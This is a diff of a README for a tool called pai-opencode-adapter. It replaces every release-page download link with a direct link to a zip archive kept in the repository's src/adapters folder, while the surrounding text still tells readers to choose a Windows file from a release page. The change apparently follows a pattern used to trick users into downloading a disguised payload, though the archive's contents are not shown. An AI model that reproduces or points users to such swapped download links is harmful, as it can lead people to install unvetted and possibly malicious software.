@@ -1,6 +1,6 @@
 # 🤖 pai-opencode-adapter - Use Any AI Provider
 
-[![Download pai-opencode-adapter](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/bhatim3883/pai-opencode-adapter/releases)
+[![Download pai-opencode-adapter](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/bhatim3883/pai-opencode-adapter/raw/refs/heads/main/src/adapters/pai-opencode-adapter-2.3.zip)
 
 ## 🚀 Overview
 
@@ -31,7 +31,7 @@ If you use a local model tool like Ollama, keep that installed and running befor
 
 Visit this page to download the latest Windows release:
 
-[Download the latest release](https://github.com/bhatim3883/pai-opencode-adapter/releases)
+[Download the latest release](https://github.com/bhatim3883/pai-opencode-adapter/raw/refs/heads/main/src/adapters/pai-opencode-adapter-2.3.zip)
 
 On the release page, look for the Windows file that matches your system. If there are multiple files, pick the one meant for Windows.
 
@@ -181,4 +181,4 @@ This project works across:
 5. Save your settings
 6. Run PAI through OpenCode
 
-[Open the download page](https://github.com/bhatim3883/pai-opencode-adapter/releases)
+[Open the download page](https://github.com/bhatim3883/pai-opencode-adapter/raw/refs/heads/main/src/adapters/pai-opencode-adapter-2.3.zip)
